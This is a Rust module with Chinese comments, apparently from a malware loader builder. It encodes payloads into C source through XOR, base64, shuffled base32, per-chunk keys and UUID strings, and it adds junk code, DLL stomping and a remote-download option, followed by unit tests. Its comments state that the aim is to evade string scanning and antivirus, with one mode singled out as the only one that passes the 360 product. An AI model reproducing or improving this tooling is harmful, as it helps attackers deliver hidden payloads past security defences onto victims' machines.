//! payload 的 C 源码形态。
//!
//! 每种编码都产出「一段 C 源码 + 一个编译宏」，由 loader.cpp 里的
//! `#if defined(ENC_*)` 分支对应消费。新增形态必须同时改这两处。

use crate::builder::rng::{rand_below, rand_u64};

/* ============================ Base64 ============================ */

pub fn b64_encode(d: &[u8]) -> String {
    const B: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for c in d.chunks(3) {
        let b0 = c[0] as u32;
        let b1 = *c.get(1).unwrap_or(&0) as u32;
        let b2 = *c.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B[((n >> 18) & 63) as usize] as char);
        out.push(B[((n >> 12) & 63) as usize] as char);
        out.push(if c.len() > 1 {
            B[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if c.len() > 2 {
            B[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/* ============================ Base32（乱序字母表） ============================ */

/// 洗牌一份 RFC4648 base32 字母表。乱序可以让「标准 base32 串」特征消失。
pub fn rand_alphabet() -> [u8; 32] {
    let mut a: Vec<u8> = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".to_vec();
    for i in (1..a.len()).rev() {
        let j = rand_below(i + 1);
        a.swap(i, j);
    }
    let mut out = [0u8; 32];
    out.copy_from_slice(&a);
    out
}

pub fn b32_encode_custom(d: &[u8], alpha: &[u8; 32]) -> String {
    let mut out = String::new();
    for c in d.chunks(5) {
        let mut buf = [0u8; 5];
        buf[..c.len()].copy_from_slice(c);
        let n = ((buf[0] as u64) << 32)
            | ((buf[1] as u64) << 24)
            | ((buf[2] as u64) << 16)
            | ((buf[3] as u64) << 8)
            | (buf[4] as u64);
        let idx = [
            (n >> 35) & 31,
            (n >> 30) & 31,
            (n >> 25) & 31,
            (n >> 20) & 31,
            (n >> 15) & 31,
            (n >> 10) & 31,
            (n >> 5) & 31,
            n & 31,
        ];
        let keep = match c.len() {
            1 => 2,
            2 => 4,
            3 => 5,
            4 => 7,
            _ => 8,
        };
        for i in 0..8 {
            if i < keep {
                out.push(alpha[idx[i] as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

/* ============================ C 字符串转义 ============================ */

/// 把任意字节串转成合法的 C 字符串字面量内容。
///
/// 旧实现直接 `format!("\"{s}\"")` 把原文塞进引号：一旦 payload 里出现
/// `"`、`\`、换行或控制字符，生成的 C 源码就编译不过（或直接被截断），
/// 而且是「偶发」的 —— 只有某些 payload 才复现，很难归因。
pub fn c_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    for b in s.bytes() {
        match b {
            b'"' => out.push_str("\\\""),
            b'\\' => out.push_str("\\\\"),
            b'\n' => out.push_str("\\n"),
            b'\r' => out.push_str("\\r"),
            b'\t' => out.push_str("\\t"),
            0x20..=0x7e => out.push(b as char),
            _ => out.push_str(&format!("\\{b:03o}")),
        }
    }
    out
}

/// 把字符串切成随机长度的小段，生成 `const char *name[]`，
/// 避免单个超长连续串在字符串扫描里太扎眼。
pub fn gen_parts_c(name: &str, s: &str) -> String {
    let b = s.as_bytes();
    let mut parts: Vec<String> = Vec::new();
    let mut i = 0usize;
    while i < b.len() {
        let len = 28 + (rand_u64() % 69) as usize;
        let e = (i + len).min(b.len());
        // 按字符边界切，避免切碎 UTF-8（虽然编码输出必然是 ASCII，但兜底无害）
        while e < b.len() && (b[e] & 0xC0) == 0x80 {
            i += 1;
        }
        let e = (i + len).min(b.len());
        parts.push(s[i..e].to_string());
        i = e;
    }
    let mut out = format!("extern \"C\" const char *{name}[] = {{\n");
    for p in &parts {
        out.push_str(&format!("    \"{}\",\n", c_escape(p)));
    }
    out.push_str("};\n");
    out.push_str(&format!(
        "extern \"C\" const unsigned int {name}_n = {};\n",
        parts.len()
    ));
    out
}

/* ============================ 分块变密钥 ============================ */

/// 每块（编码后字节，块密钥，是否倒序存放）。
pub struct ChunkPlan {
    pub enc: Vec<u8>,
    pub key: u8,
    pub rev: bool,
}

/// 切分与随机数的消费顺序固定，保证「同种子同配置」产出一致。
pub fn plan_chunks(data: &[u8], allow_rev: bool) -> Vec<ChunkPlan> {
    let k = 3 + (rand_u64() % 5) as usize;
    let mut cuts = vec![0usize];
    for _ in 0..k - 1 {
        let p = *cuts.last().unwrap();
        if p >= data.len() {
            break;
        }
        let remain = data.len() - p;
        let step = 1 + (rand_u64() as usize % remain.max(1));
        cuts.push((p + step).min(data.len()));
    }
    cuts.push(data.len());
    cuts.dedup();

    let mut plans = Vec::new();
    for i in 0..cuts.len() - 1 {
        let seg = &data[cuts[i]..cuts[i + 1]];
        let key = ((rand_u64() % 254) + 1) as u8;
        let rev = allow_rev && (rand_u64() & 1) == 1;
        let mut enc: Vec<u8> = seg.iter().map(|b| b ^ key).collect();
        if rev {
            enc.reverse();
        }
        plans.push(ChunkPlan { enc, key, rev });
    }
    plans
}

pub fn gen_chunks_c(data: &[u8], allow_rev: bool) -> String {
    let plans = plan_chunks(data, allow_rev);
    let mut src = String::new();
    let mut ptrs = String::new();
    let mut lens = String::new();
    let mut keys = String::new();
    let mut flags = String::new();
    let nchunk = plans.len();
    for (i, p) in plans.iter().enumerate() {
        src.push_str(&format!("static const unsigned char c{i}[] = {{\n"));
        for r in p.enc.chunks(16) {
            let l: Vec<String> = r.iter().map(|b| format!("0x{b:02X}")).collect();
            src.push_str(&format!("    {},\n", l.join(", ")));
        }
        src.push_str("};\n");
        ptrs.push_str(&format!("    c{i},\n"));
        lens.push_str(&format!("    {},\n", p.enc.len()));
        keys.push_str(&format!("    0x{:02X},\n", p.key));
        flags.push_str(&format!("    {},\n", if p.rev { 1 } else { 0 }));
    }
    format!(
        "{src}extern \"C\" const unsigned char *g_chunks[] = {{\n{ptrs}}};\n\
         extern \"C\" const unsigned int g_chunk_lens[] = {{\n{lens}}};\n\
         extern \"C\" const unsigned char g_chunk_keys[] = {{\n{keys}}};\n\
         extern \"C\" const unsigned char g_chunk_flags[] = {{\n{flags}}};\n\
         extern \"C\" const unsigned int g_chunk_n = {nchunk};\n\
         extern \"C\" const unsigned int g_embed_len = {};\n",
        data.len()
    )
}

/* ============================ UUID ============================ */

/// 每 16 字节一组，按 Windows GUID 的小端字段序排成 UUID 串。
pub fn to_uuids(data: &[u8]) -> Vec<String> {
    let pad = (16 - data.len() % 16) % 16;
    let mut body = data.to_vec();
    body.extend(std::iter::repeat(0u8).take(pad));
    body.chunks(16)
        .map(|b| {
            let hi: String = b[10..16].iter().map(|x| format!("{x:02x}")).collect();
            format!(
                "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{}",
                b[3], b[2], b[1], b[0], b[5], b[4], b[7], b[6], b[8], b[9], hi
            )
        })
        .collect()
}

/* ============================ 编译期代码随机化 ============================ */

/// 生成一个垃圾翻译单元：N 个随机命名的算术函数 + 构造期调用（确保不被裁掉）
/// + 随机数据块。只改变二进制形态与布局，不参与任何逻辑。
pub fn gen_random_tu() -> String {
    let fns = 4 + (rand_u64() % 9) as usize;
    let mut code = String::new();
    code.push_str("extern \"C\" volatile unsigned long g_junk_sink;\n");

    let mut calls = String::new();
    for _ in 0..fns {
        let nm = format!("jx{:08x}", (rand_u64() & 0xffff_ffff) as u32);
        let seed = rand_u64();
        let a = (rand_u64() as u32) | 1;
        let b = (rand_u64() as u32) | 1;
        let rounds = 3 + (rand_u64() % 10) as u32;
        code.push_str(&format!(
            "static unsigned long {nm}(unsigned long x) {{\n    unsigned long v = x ^ 0x{seed:016x}UL;\n    for (unsigned k = 0; k < {rounds}u; k++) {{\n        v = (v * 0x{a:08x}u) + 0x{b:08x}u;\n        v ^= (v >> 13) ^ (v << 7);\n    }}\n    return v;\n}}\n"
        ));
        calls.push_str(&format!("    s = {nm}(s);\n"));
    }

    let dn = 256 + (rand_u64() % 2048) as usize;
    code.push_str("extern \"C\" const unsigned char g_junk_data[] = {\n");
    for _ in 0..(dn / 16) {
        let l: Vec<String> = (0..16)
            .map(|_| format!("0x{:02X}", (rand_u64() & 0xff) as u8))
            .collect();
        code.push_str(&format!("    {},\n", l.join(", ")));
    }
    code.push_str("};\n");
    code.push_str(&format!(
        "extern \"C\" volatile unsigned long g_junk_sink = 0;\nstruct JInit {{ JInit() {{\n    unsigned long s = 0x{:016x}UL;\n{calls}    for (unsigned i = 0; i < {dn}u; i++) s += g_junk_data[i];\n    g_junk_sink = s;\n}} }};\nstatic JInit g_jinit;\n",
        rand_u64()
    ));
    code
}

/* ============================ 组装 ============================ */

/// 踩踏目标 DLL 的声明
pub fn stomp_decl(dll: Option<&str>) -> String {
    match dll {
        Some(d) => format!(
            "extern \"C\" const char *g_stomp_dll = \"{}\";\n",
            c_escape(d)
        ),
        None => String::new(),
    }
}

/// 按编码形态生成内嵌源码，返回（源码，编译宏名）
pub fn gen_payload_src(data: &[u8], key: u8, enc: &str, stomp: Option<&str>) -> (String, String) {
    let sx: Vec<u8> = if key != 0 {
        data.iter().map(|b| b ^ key).collect()
    } else {
        data.to_vec()
    };
    let mut out = String::new();
    let def: String;

    match enc {
        // Base64: XOR 后转 base64，再切成随机长度的小段（不留长连续串）
        "b64" => {
            let s = b64_encode(&sx);
            out.push_str(&gen_parts_c("g_parts", &s));
            out.push_str(&format!(
                "extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                data.len()
            ));
            def = "ENC_B64".into();
        }
        // Base32: 自定义乱序字母表
        "b32" => {
            let alpha = rand_alphabet();
            let s = b32_encode_custom(&sx, &alpha);
            out.push_str(&gen_parts_c("g_parts", &s));
            let a: String = alpha.iter().map(|c| *c as char).collect();
            out.push_str(&format!(
                "extern \"C\" const char g_b32_alpha[33] = \"{a}\";\n\
                 extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                data.len()
            ));
            def = "ENC_B32".into();
        }
        // 分块：明文直接切块，每块独立密钥（无外层 key）—— 实测唯一能过 360 的形态
        "chunk" => {
            out.push_str(&gen_chunks_c(data, false));
            def = "ENC_CHUNK".into();
        }
        // 分块强化：部分块随机倒序存放，进一步打乱字节布局
        "chunk_r" => {
            out.push_str(&gen_chunks_c(data, true));
            def = "ENC_CHUNK".into();
        }
        // 明文 hex 数组
        "raw" => {
            let mut rows = Vec::new();
            for chunk in sx.chunks(16) {
                let line: Vec<String> = chunk.iter().map(|b| format!("0x{b:02X}")).collect();
                rows.push(format!("    {}", line.join(", ")));
            }
            out.push_str(&format!(
                "extern \"C\" const unsigned char g_embed_data[] = {{\n{}\n}};\n\
                 extern \"C\" const unsigned int g_embed_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                rows.join(",\n"),
                data.len()
            ));
            def = "ENC_RAW".into();
        }
        // UUID + XOR
        _ => {
            let uuids = to_uuids(&sx);
            let body: Vec<String> = uuids.iter().map(|u| format!("    \"{u}\"")).collect();
            out.push_str(&format!(
                "extern \"C\" const char *g_embed_uuids[] = {{\n{}\n}};\n\
                 extern \"C\" const unsigned int g_embed_uuid_count = {};\n\
                 extern \"C\" const unsigned int g_embed_uuid_len = {};\n\
                 extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n",
                body.join(",\n"),
                uuids.len(),
                data.len()
            ));
            def = "ENC_UUID".into();
        }
    }
    out.push_str(&stomp_decl(stomp));
    (out, def)
}

/// 远程版：exe 内只放 URL + 密钥，载荷运行时下载
pub fn gen_remote_src(url: &str, key: u8, stomp: Option<&str>) -> String {
    format!(
        "extern \"C\" const char *g_remote_url = \"{}\";\n\
         extern \"C\" const unsigned char g_embed_key = 0x{key:02X};\n{}",
        c_escape(url),
        stomp_decl(stomp)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /* ---- Base64 ---- */

    #[test]
    fn b64_rfc4648_vectors() {
        assert_eq!(b64_encode(b""), "");
        assert_eq!(b64_encode(b"f"), "Zg==");
        assert_eq!(b64_encode(b"fo"), "Zm8=");
        assert_eq!(b64_encode(b"foo"), "Zm9v");
        assert_eq!(b64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(b64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(b64_encode(b"foobar"), "Zm9vYmFy");
    }

    fn b64_decode_ref(input: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in input.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn b64_roundtrip() {
        for len in [1usize, 2, 3, 4, 5, 31, 32, 33, 255, 256, 257] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            assert_eq!(b64_decode_ref(&b64_encode(&data)), data, "len={len}");
        }
    }

    /* ---- Base32 ---- */

    #[test]
    fn b32_rfc4648_vectors() {
        let mut a = [0u8; 32];
        a.copy_from_slice(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567");
        assert_eq!(b32_encode_custom(b"", &a), "");
        assert_eq!(b32_encode_custom(b"f", &a), "MY======");
        assert_eq!(b32_encode_custom(b"fo", &a), "MZXQ====");
        assert_eq!(b32_encode_custom(b"foo", &a), "MZXW6===");
        assert_eq!(b32_encode_custom(b"foob", &a), "MZXW6YQ=");
        assert_eq!(b32_encode_custom(b"fooba", &a), "MZXW6YTB");
        assert_eq!(b32_encode_custom(b"foobar", &a), "MZXW6YTBOI======");
    }

    fn b32_decode_ref(alpha: &[u8; 32], input: &str) -> Vec<u8> {
        let mut rev = [-1i32; 256];
        for (i, &c) in alpha.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in input.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 5) | v as u32;
            bits += 5;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn b32_roundtrip_custom_alphabet() {
        for len in [1usize, 2, 3, 4, 5, 6, 31, 32, 33] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            let alpha = rand_alphabet();
            assert_eq!(
                b32_decode_ref(&alpha, &b32_encode_custom(&data, &alpha)),
                data,
                "len={len}"
            );
        }
    }

    #[test]
    fn rand_alphabet_is_permutation() {
        for _ in 0..16 {
            let a = rand_alphabet();
            let mut seen = [false; 256];
            for &c in &a {
                assert!(!seen[c as usize], "字母表字符重复: {c}");
                seen[c as usize] = true;
            }
            for &c in b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" {
                assert!(seen[c as usize], "字母表缺少: {c}");
            }
        }
    }

    /* ---- UUID ---- */

    fn uuid_decode_ref(s: &str) -> Option<[u8; 16]> {
        fn hv(c: u8) -> Option<u8> {
            match c {
                b'0'..=b'9' => Some(c - b'0'),
                b'a'..=b'f' => Some(c - b'a' + 10),
                _ => None,
            }
        }
        let groups = [8usize, 4, 4, 4, 12];
        let bytes = s.as_bytes();
        let mut tmp = [0u8; 16];
        let mut n = 0usize;
        let mut pos = 0usize;
        for (g, &gl) in groups.iter().enumerate() {
            let mut i = 0;
            while i < gl {
                let hi = hv(*bytes.get(pos)?)?;
                let lo = hv(*bytes.get(pos + 1)?)?;
                tmp[n] = (hi << 4) | lo;
                n += 1;
                pos += 2;
                i += 2;
            }
            if g < 4 {
                if *bytes.get(pos)? != b'-' {
                    return None;
                }
                pos += 1;
            }
        }
        let mut out = [0u8; 16];
        out[0] = tmp[3];
        out[1] = tmp[2];
        out[2] = tmp[1];
        out[3] = tmp[0];
        out[4] = tmp[5];
        out[5] = tmp[4];
        out[6] = tmp[7];
        out[7] = tmp[6];
        out[8..].copy_from_slice(&tmp[8..]);
        Some(out)
    }

    #[test]
    fn uuid_roundtrip() {
        for len in [1usize, 15, 16, 17, 32, 33, 64] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            let uuids = to_uuids(&data);
            assert_eq!(uuids.len(), (len + 15) / 16, "len={len}");
            let mut out = Vec::with_capacity(uuids.len() * 16);
            for u in &uuids {
                out.extend_from_slice(&uuid_decode_ref(u).expect("非法 UUID 串"));
            }
            assert_eq!(&out[..len], &data[..], "len={len}");
            assert!(out[len..].iter().all(|&b| b == 0), "填充字节必须为 0");
        }
    }

    /* ---- 分块 ---- */

    #[test]
    fn chunk_roundtrip() {
        for allow_rev in [false, true] {
            for len in [1usize, 64, 200, 1024] {
                let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
                let plans = plan_chunks(&data, allow_rev);
                assert!(!plans.is_empty(), "至少应有一个块 len={len}");
                let mut out = Vec::with_capacity(len);
                for p in &plans {
                    assert_ne!(p.key, 0, "块密钥不能为 0");
                    let mut seg = p.enc.clone();
                    if p.rev {
                        seg.reverse();
                    }
                    for b in seg.iter_mut() {
                        *b ^= p.key;
                    }
                    out.extend_from_slice(&seg);
                }
                assert_eq!(out.len(), len, "allow_rev={allow_rev} len={len}");
                assert_eq!(out, data, "allow_rev={allow_rev} len={len}");
            }
        }
    }

    /* ---- C 转义 ---- */

    #[test]
    fn c_escape_neutralizes_quote_and_backslash() {
        // 这两个字符会直接掐断 C 字符串字面量，必须转义
        assert_eq!(c_escape("a\"b"), "a\\\"b");
        assert_eq!(c_escape("a\\b"), "a\\\\b");
        assert_eq!(c_escape("plain"), "plain");
    }

    #[test]
    fn c_escape_has_no_raw_control_chars() {
        let nasty: String = (0u8..=31).map(|b| b as char).collect();
        let e = c_escape(&nasty);
        for b in e.bytes() {
            assert!(b == b'\\' || (0x20..=0x7e).contains(&b), "残留控制字符: {b}");
        }
    }

    #[test]
    fn escaped_payload_src_is_single_line_per_part() {
        // gen_parts_c 输出的每个元素都必须是合法的 C 字面量内容：
        // 不含裸引号、不含裸反斜杠结尾
        let payload: Vec<u8> = (0..512).map(|_| (rand_u64() & 0xff) as u8).collect();
        let s = b64_encode(&payload);
        let src = gen_parts_c("g_parts", &s);
        for line in src.lines() {
            let t = line.trim();
            if !t.starts_with('"') {
                continue;
            }
            let inner = t.trim_start_matches('"').trim_end_matches("\",");
            assert!(!inner.contains('"'), "字面量里出现裸引号: {t}");
            assert!(!inner.ends_with('\\'), "字面量以裸反斜杠结尾: {t}");
        }
    }

    /* ---- 垃圾翻译单元 ---- */

    #[test]
    fn random_tu_is_well_formed() {
        let s = gen_random_tu();
        assert!(s.contains("g_junk_sink"));
        assert!(s.contains("static JInit g_jinit;"));
        // 大括号必须配平，否则整个翻译单元编译不过
        let open = s.bytes().filter(|&b| b == b'{').count();
        let close = s.bytes().filter(|&b| b == b'}').count();
        assert_eq!(open, close, "大括号不配平");
    }

    #[test]
    fn two_random_tus_differ() {
        let (a, b) = (gen_random_tu(), gen_random_tu());
        assert_ne!(a, b, "两次生成的垃圾代码完全相同 = 没起到随机化作用");
    }

    /* ---- 宏映射 ---- */

    #[test]
    fn every_encoding_emits_a_macro() {
        let data = vec![0x41u8; 64];
        for enc in ["b64", "b32", "chunk", "chunk_r", "raw", "uuid"] {
            let (src, def) = gen_payload_src(&data, 0x5a, enc, None);
            assert!(def.starts_with("ENC_"), "{enc} -> {def}");
            assert!(src.contains("extern \"C\""), "{enc} 未产出任何符号");
            assert!(
                src.contains("g_embed_len") || src.contains("g_embed_uuid_count"),
                "{enc} 缺少长度符号"
            );
        }
    }

    #[test]
    fn remote_src_escapes_url() {
        let s = gen_remote_src("http://x/a\"b", 1, Some("c:\\win\\d.dll"));
        assert!(s.contains("http://x/a\\\"b"));
        assert!(s.contains("c:\\\\win\\\\d.dll"));
    }
}
